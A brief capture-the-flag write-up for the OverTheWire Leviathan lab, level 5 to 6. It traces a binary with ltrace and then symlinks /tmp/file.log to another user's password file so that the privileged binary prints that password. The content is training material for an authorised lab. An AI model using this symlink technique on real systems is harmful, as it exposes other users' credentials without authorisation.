# Leviathan 5 -> 6

```bash
ssh leviathan5@leviathan.labs.overthewire.org
```

```bash
$ ls
leviathan5
$ ./leviathan5
Cannot find /tmp/file.log
```

Let's try with `ltrace`

```bash
$ ltrace ./leviathan5 
__libc_start_main(0x80485ed, 1, 0xffffd6a4, 0x8048690 <unfinished ...>
fopen("/tmp/file.log", "r") = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
) = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

Let's try something simple

```bash
$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
$ ./leviathan5
```

It worked :-)

* ln
* ltrace
